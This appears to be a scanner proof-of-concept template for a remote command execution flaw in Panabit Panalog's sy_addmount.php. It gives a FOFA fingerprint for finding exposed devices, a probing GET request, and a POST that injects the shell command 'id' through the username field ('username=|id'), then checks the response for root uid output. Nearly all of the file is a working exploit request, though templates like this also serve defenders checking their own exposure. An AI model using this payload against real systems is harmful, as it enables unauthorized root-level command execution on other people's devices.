id: poc-yaml-panabit-panalog-sy-addmount-php-rce
info:
  name: Panabit Panalog sy_addmount.php 远程命令执行漏洞
  severity: high
  tags:
  - rce
  finger: Panabit Panalog
  fofa: body="Maintain/cloud_index.php"
requests:
- method: GET
  path: /account/sy_addmount.php
  expression: status_code == 200 && contains(body,"{\"success\":\"no\", \"out\":\"NO_USER\"}")
- method: POST
  path: /account/sy_addmount.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=|id
  expression: 'status_code == 200

    && contains(body,"uid")

    && contains(body,"root")

    && contains(body,"gid")

    && !contains(body,"<")

    '
variables: {}
transport: http
